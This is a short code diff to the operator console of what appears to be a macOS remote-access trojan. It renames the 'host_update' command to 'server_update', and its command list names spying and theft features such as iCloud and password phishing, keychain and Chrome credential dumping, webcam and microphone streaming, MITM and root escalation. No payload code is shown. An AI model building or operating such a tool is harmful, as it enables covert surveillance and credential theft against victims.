@@ -24,7 +24,7 @@ greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'update_db_entry', 'iOS_sms', 'webcam', 'volume', 'version', 'set_client_name', 'host_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'update_db_entry', 'iOS_sms', 'webcam', 'volume', 'version', 'set_client_name', 'server_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -625,8 +625,8 @@ def main():
                         else:
                             nextcmd = "set_client_name:::%s" % nextcmd.replace('set_client_name ', '')
                         
-                    if nextcmd == "host_update":
-                        if nextcmd == "host_update": #no stdin
+                    if nextcmd == "server_update":
+                        if nextcmd == "server_update": #no stdin
                             local_file= raw_input("📡  Enter full path to new server on local machine: ")
                         else:
                             local_file = nextcmd[14:] #take path as stdin
